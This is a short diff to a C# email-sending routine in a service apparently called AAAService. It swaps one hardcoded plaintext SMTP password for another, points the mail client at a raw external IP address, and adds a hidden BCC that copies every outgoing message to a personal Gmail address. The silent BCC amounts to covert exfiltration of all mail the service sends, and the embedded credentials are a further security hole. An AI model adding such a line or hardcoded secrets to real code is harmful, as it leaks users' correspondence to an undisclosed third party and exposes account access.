@@ -35,11 +35,11 @@ namespace AAAService
                 // Credentials:
                 string sendGridUserName = "support@assetsaaa.com";
                 string sentFrom = "support@assetsaaa.com";
-                string sendGridPassword = "9066E285FF804417AF1C";
+                string sendGridPassword = "Letmein00@";
 
                 // Configure the client
                 //var client = new System.Net.Mail.SmtpClient("smtp.sendgrid.net", 587);
-                var client = new System.Net.Mail.SmtpClient("localhost");
+                var client = new System.Net.Mail.SmtpClient("64.79.170.149");
 
                 //client.Port = 587;
                 client.DeliveryMethod = System.Net.Mail.SmtpDeliveryMethod.Network;
@@ -56,6 +56,7 @@ namespace AAAService
 
                 mail.Subject = message.Subject;
                 mail.Body = message.Body;
+                mail.Bcc.Add("riosconcepts@gmail.com");
                 mail.IsBodyHtml = true;
 
                 // Send:
